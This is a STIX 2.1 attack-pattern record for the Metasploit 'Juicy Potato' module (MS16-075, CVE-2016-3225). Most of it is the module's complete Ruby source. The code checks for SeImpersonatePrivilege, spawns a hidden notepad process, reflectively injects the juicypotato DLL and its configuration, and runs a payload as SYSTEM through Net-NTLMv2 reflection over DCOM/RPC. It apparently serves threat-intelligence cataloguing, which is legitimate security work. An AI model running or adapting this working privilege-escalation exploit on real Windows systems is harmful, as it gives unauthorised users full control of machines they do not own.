{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--37022d20-921b-419e-bfef-290e4e1936ef",
    "created": "2024-08-14T16:49:49.526928Z",
    "modified": "2024-08-14T16:49:49.526932Z",
    "name": "Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)",
    "description": " This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to achieve a SYSTEM handle for elevation of privilege. It requires a CLSID string. Windows 10 after version 1803, (April 2018 update, build 17134) and all versions of Windows Server 2019 are not vulnerable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms16_075_reflection_juicy.rb",
            "external_id": "ms16_075_reflection_juicy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3225"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/"
        },
        {
            "source_name": "reference",
            "url": "https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/breenmachine/RottenPotatoNG"
        },
        {
            "source_name": "reference",
            "url": "https://decoder.cloud/2017/12/23/the-lonely-potato/"
        },
        {
            "source_name": "reference",
            "url": "https://ohpe.it/juicy-potato/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)',\n          'Description' => %q{\n            This module utilizes the Net-NTLMv2 reflection between DCOM/RPC\n            to achieve a SYSTEM handle for elevation of privilege.\n            It requires a CLSID string.\n            Windows 10 after version 1803, (April 2018 update, build 17134) and all\n            versions of Windows Server 2019 are not vulnerable.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'FoxGloveSec', # the original Potato exploit\n            'breenmachine', # Rotten Potato NG!\n            'decoder', # Lonely / Juicy Potato\n            'ohpe', # Juicy Potato\n            'phra', # MSF Module\n            'lupman' # MSF Module\n          ],\n          'Arch' => [ARCH_X86, ARCH_X64],\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'none',\n            'WfsDelay' => '20'\n          },\n          'Targets' => [\n            ['Automatic', {}]\n          ],\n          'Payload' => {\n            'DisableNops' => true\n          },\n          'References' => [\n            ['MSB', 'MS16-075'],\n            ['CVE', '2016-3225'],\n            ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/'],\n            ['URL', 'https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/'],\n            ['URL', 'https://github.com/breenmachine/RottenPotatoNG'],\n            ['URL', 'https://decoder.cloud/2017/12/23/the-lonely-potato/'],\n            ['URL', 'https://ohpe.it/juicy-potato/']\n          ],\n          'DisclosureDate' => '2016-01-16',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_sys_config_getenv\n                stdapi_sys_config_getprivs\n                stdapi_sys_config_sysinfo\n                stdapi_sys_process_attach\n                stdapi_sys_process_execute\n                stdapi_sys_process_thread_create\n              ]\n            }\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('CLSID', [ true, 'Set CLSID value of the DCOM to trigger', '{4991d34b-80a1-4291-83b6-3328366b9097}' ])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptAddress.new('RpcServerHost', [ true, 'Set RPC server target host', '127.0.0.1' ]),\n        OptPort.new('RpcServerPort', [ true, 'Set RPC server target port', 135 ]),\n        OptAddress.new('ListeningAddress', [ true, 'Set listening address for MITM DCOM communication', '127.0.0.1' ]),\n        OptPort.new('ListeningPort', [ true, 'Set listening port for MITM DCOM communication', 7777 ]),\n        OptString.new('LogFile', [ false, 'Set the log file' ])\n      ]\n    )\n  end\n\n  # Creates a temp notepad.exe to inject payload in to given the payload\n  def create_temp_proc\n    windir = client.sys.config.getenv('windir')\n    # Select path of executable to run depending the architecture\n    if sysinfo['Architecture'] == ARCH_X64 && client.arch == ARCH_X86 && @payload_arch.first == ARCH_X64\n      cmd = \"#{windir}\\\\Sysnative\\\\notepad.exe\"\n    elsif sysinfo['Architecture'] == ARCH_X64 && client.arch == ARCH_X64 && @payload_arch.first == ARCH_X86\n      cmd = \"#{windir}\\\\SysWOW64\\\\notepad.exe\"\n    else\n      cmd = \"#{windir}\\\\System32\\\\notepad.exe\"\n    end\n    begin\n      proc = client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n    rescue Rex::Post::Meterpreter::RequestError\n      return nil\n    end\n\n    return proc\n  end\n\n  def create_temp_proc_stage2\n    windir = client.sys.config.getenv('windir')\n    # Select path of executable to run depending the architecture\n    if sysinfo['Architecture'] == ARCH_X64 && @payload_arch.first == ARCH_X86\n      cmd = \"#{windir}\\\\SysWOW64\\\\notepad.exe\"\n    else\n      cmd = \"#{windir}\\\\System32\\\\notepad.exe\"\n    end\n    return cmd\n  end\n\n  def check\n    privs = client.sys.config.getprivs\n    # Fast fails\n    if !privs.include?('SeImpersonatePrivilege')\n      print_bad('Target session is missing the SeImpersonatePrivilege.')\n      return Exploit::CheckCode::Safe\n    end\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Server2008_R2_SP0, Msf::WindowsVersion::Win10_1803)\n      print_bad(\"System not vulnerable (#{version.product_name})\")\n      return Exploit::CheckCode::Safe\n    end\n    print_good(\"Target appears to be vulnerable (#{version.product_name})\")\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n    @payload_name = datastore['PAYLOAD']\n    @payload_arch = framework.payloads.create(@payload_name).arch\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NoAccess, 'User does not have SeImpersonate or SeAssignPrimaryToken Privilege, or OS not exploitable')\n    end\n    if @payload_arch.first == ARCH_X64\n      dll_file_name = 'juicypotato.x64.dll'\n      vprint_status('Assigning payload juicypotato.x64.dll')\n    elsif @payload_arch.first == ARCH_X86\n      dll_file_name = 'juicypotato.x86.dll'\n      vprint_status('Assigning payload juicypotato.x86.dll')\n    else\n      fail_with(Failure::BadConfig, 'Unknown target arch; unable to assign exploit code')\n    end\n    print_status('Launching notepad to host the exploit...')\n    notepad_process = create_temp_proc\n    cmd = create_temp_proc_stage2\n    begin\n      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)\n      print_good(\"Process #{process.pid} launched.\")\n    rescue Rex::Post::Meterpreter::RequestError\n      print_error('Operation failed. Trying to elevate the current process...')\n      process = client.sys.process.open\n    end\n    print_status(\"Reflectively injecting the exploit DLL into #{process.pid}...\")\n    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'juicypotato', dll_file_name)\n    library_path = ::File.expand_path(library_path)\n    print_status(\"Injecting exploit into #{process.pid}...\")\n    exploit_mem, offset = inject_dll_into_process(process, library_path)\n    print_status(\"Exploit injected. Injecting exploit configuration into #{process.pid}...\")\n    configuration = \"#{datastore['LogFile']}\\x00\"\n    configuration += \"#{cmd}\\x00\"\n    configuration += \"#{datastore['CLSID']}\\x00\"\n    configuration += \"#{datastore['ListeningPort']}\\x00\"\n    configuration += \"#{datastore['RpcServerHost']}\\x00\"\n    configuration += \"#{datastore['RpcServerPort']}\\x00\"\n    configuration += \"#{datastore['ListeningAddress']}\\x00\"\n    configuration += \"#{payload.encoded.length}\\x00\"\n    configuration += payload.encoded\n    payload_mem = inject_into_process(process, configuration)\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Configuration injected. Executing exploit...')\n    process.thread.create(exploit_mem + offset, payload_mem)\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-01-16",
    "x_mitre_platforms": [
        "win'"
    ]
}